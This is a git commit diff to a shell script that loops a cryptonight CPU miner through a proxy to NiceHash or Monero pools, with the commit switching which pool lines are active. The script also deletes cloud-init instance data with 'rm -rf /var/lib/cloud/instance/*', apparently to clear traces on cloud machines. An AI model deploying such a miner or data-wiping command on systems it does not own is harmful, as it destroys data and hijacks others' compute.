eb4f27faf56c6e1ad1fe69dbba07952f60fe552a
smithinoz <smithinoz@users.noreply.github.com>
2017-06-14 17:23:24 +1000

    Create a.sh

--- a.sh
+++ a.sh
@@ -15,9 +15,9 @@ if [ ! -f ./cpuminer ]; then
 fi
 rm -rf /var/lib/cloud/instance/*
 while true; do
-#	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
-#	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
-	./cpuminer -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
-	./cpuminer -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
+	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
+	./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
+#	./cpuminer -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
+#	./cpuminer -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
 
 done
